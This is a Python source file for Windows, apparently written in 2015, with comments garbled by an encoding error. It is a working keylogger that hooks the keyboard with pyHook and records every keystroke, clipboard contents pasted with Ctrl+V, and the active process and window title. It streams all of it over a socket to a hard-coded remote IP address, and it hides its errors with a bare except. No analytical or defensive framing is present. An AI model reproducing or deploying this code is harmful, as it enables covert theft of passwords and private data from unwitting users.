# -*- coding: utf-8 -*-  
'''
Created on 2015骞�鏈�鏃�

@author: 绉戣开
'''
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import threading
from win32con import OUT_CHARACTER_PRECIS
  
import socket
import time  
current_window = None
ISOTIMEFORMAT='%Y-%m-%d %X'
current_time=time.strftime(ISOTIMEFORMAT, time.localtime())
keylooger_cache=''

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi

target_host = "59.78.26.99"
target_port = 8080
try:
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client.connect((target_host,target_port))
    client.send("start logging---------------------------------------------"+current_time)
    #
    def get_current_process():
        global keylooger_cache
        # 鑾峰彇鏈�笂灞傜殑绐楀彛鍙ユ焺
        hwnd = user32.GetForegroundWindow()
      
        # 鑾峰彇杩涚▼ID
        pid = c_ulong(0)
        user32.GetWindowThreadProcessId(hwnd,byref(pid))
      
        # 灏嗚繘绋婭D瀛樺叆鍙橀噺涓�
        process_id = "%d" % pid.value
      
        # 鐢宠鍐呭瓨
        executable = create_string_buffer("\x00"*512)
        h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)
      
        psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
      
        # 璇诲彇绐楀彛鏍囬
        windows_title = create_string_buffer("\x00"*512)
        length = user32.GetWindowTextA(hwnd,byref(windows_title),512)
      
        # 鎵撳嵃
        #print
        out="[ PID:%s-%s-%s]" % (process_id,executable.value,windows_title.value)
        #print "[ PID:%s-%s-%s]" % (process_id,executable.value,windows_title.value)
        client.send(out)
        keylooger_cache+=out
        keylooger_cache+='\n'
        #print
      
        # 鍏抽棴handles
        kernel32.CloseHandle(hwnd)
        kernel32.CloseHandle(h_process)
      
    # 瀹氫箟鍑婚敭鐩戝惉浜嬩欢鍑芥暟
    def KeyStroke(event):
      
        global current_window
        global keylooger_cache
        # 妫�祴鐩爣绐楀彛鏄惁杞Щ(鎹簡鍏朵粬绐楀彛灏辩洃鍚柊鐨勭獥鍙�
        if event.WindowName != current_window:
            current_window = event.WindowName
            # 鍑芥暟璋冪敤
            get_current_process()
      
        # 妫�祴鍑婚敭鏄惁甯歌鎸夐敭锛堥潪缁勫悎閿瓑锛�
        if event.Ascii > 32 and event.Ascii <127:
            #print chr(event.Ascii),
            client.send(chr(event.Ascii))
        else:
            # 濡傛灉鍙戠幇Ctrl+v锛堢矘璐达級浜嬩欢锛屽氨鎶婄矘璐存澘鍐呭璁板綍涓嬫潵
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                out="[PASTE]-%s " % (pasted_value)
               # print "[PASTE]-%s" % (pasted_value),
                #print out
                client.send(out)
                keylooger_cache+=out
            else:
                out="[%s] " % event.Key
                #print "[%s]" % event.Key,
                keylooger_cache+=out
                client.send(out)
        # 寰幆鐩戝惉涓嬩竴涓嚮閿簨浠�
        return True
      
    
     
        
        # 鍒涘缓骞舵敞鍐宧ook绠＄悊鍣�
    kl = pyHook.HookManager()
    kl.KeyDown = KeyStroke
      
        # 娉ㄥ唽hook骞舵墽琛�
    kl.HookKeyboard()
    pythoncom.PumpMessages()
except:
    pass
